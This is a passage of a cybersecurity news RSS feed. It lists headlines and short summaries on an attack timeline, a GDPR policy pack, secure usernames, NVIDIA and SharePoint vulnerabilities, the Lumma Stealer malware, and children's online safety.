2025, I collected 115 events (7.67 events/day) with a threat landscape dominated by malware with 30%, the same value of the previous timeline.</description><guid isPermaLink="false">https://www.hackmageddon.com/?p=44794</guid><category>Cyber Attacks Timelines</category><category>Security</category><category>2025</category><category>Cyber Attacks</category><category>Cyber Crime</category><category>Cyber Espionage</category><category>Cyber Warfare</category><category>February</category><category>H1</category><category>Hacktivism</category><category>Ransomware</category><category>Timeline</category><category>Vulnerabilities</category></item><item><title>GDPR Security Pack</title><link>https://www.techrepublic.com/resource-library/it-policy/gdpr-security-pack/</link><description>Save $55 with this policy pack and enhance your handling of the General Data Protection Regulation. Constantly Updated — The download contains the latest and most accurate details. Pack Comprises the Following Policies: Data Classification. Password Management. Auditing and Logging. Encryption. Intrusion Detection. Incident Response. Expert Guidance — Created by TechRepublic writers through 55 hours ...</description><guid isPermaLink="false">https://www.techrepublic.com/resource-library/whitepapers/gdpr-security-pack-policies-to-protect-data-and-achieve-compliance/</guid><category>Cybersecurity</category><category>Data</category><category>IT Resources</category></item><item><title>How to Create a Secure Username</title><link>https://www.techrepublic.com/article/how-to-create-a-secure-username/</link><description>Discover how to create a unique and secure username for your online accounts, and find out why it’s just as important as having a strong password.</description><category>Cloud Security</category><category>Security</category><category>passwords</category><category>secure username</category><category>username</category></item><item><title>Critical Flaw in NVIDIA AI Toolkit Puts Cloud Services at Risk – Upgrade Immediately</title><link>https://www.techrepublic.com/article/news-nvidia-ai-toolkit-critical-flaw/</link><description>A critical flaw in NVIDIA's AI container toolkit (CVE-2025-23266) allows full host takeover, posing serious risks to cloud-based AI services.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4317768</guid><category>Artificial Intelligence</category><category>Cloud</category><category>Cloud Security</category><category>News</category><category>Security</category></item><item><title>Back to Business: Lumma Stealer Returns with Stealthier Methods</title><link>https://www.trendmicro.com/en_us/research/25/g/lumma-stealer-returns.html</link><description>Lumma Stealer has re-emerged shortly after its takedown. This time, the cybergroup behind this malware appears to be intent on employing more covert tactics while steadily expanding its reach. This article shares the latest methods used to propagate this threat.</description><guid isPermaLink="false">urn:uuid:7d90d154-518a-768f-cb8e-566e1190db7d</guid><category>Trend Micro Research : Endpoints</category><category>Trend Micro Research : Malware</category><category>Trend Micro Research : Research</category><category>Trend Micro Research : Articles, News, Reports</category></item><item><title>Proactive Security Insights for SharePoint Attacks (CVE-2025-53770 and CVE-2025-53771)</title><link>https://www.trendmicro.com/en_us/research/25/g/cve-2025-53770-and-cve-2025-53771-sharepoint-attacks.html</link><description>CVE-2025-53770 and CVE-2025-53771 are vulnerabilities in on-premise Microsoft SharePoint Servers that evolved from previously patched flaws, allowing unauthenticated remote code execution through advanced deserialization and ViewState abuse.</description><guid isPermaLink="false">urn:uuid:860356d9-46e3-7abf-f046-c82ddb05f0ab</guid><category>Trend Micro Research : Exploits &amp; Vulnerabilities</category><category>Trend Micro Research : Research</category><category>Trend Micro Research : Articles, News, Reports</category><category>Trend Micro Research : Cyber Threats</category></item><item><title>Back-to-school cyber safety: Parent checklist</title><link>https://www.webroot.com/blog/2025/07/21/back-to-school-cyber-safety-parent-checklist/</link><description>&lt;p&gt;Summer is flying by and before you know it, you’ll be buying backpacks and taking first-day-of-school photos. Back-to-school season brings new classes and friends, but it also brings new digital dangers. By the time you’ve dropped your kids off for their first day of class, chances are they’ve already been exposed to their first cyberthreat [&amp;#8230;]&lt;/p&gt;
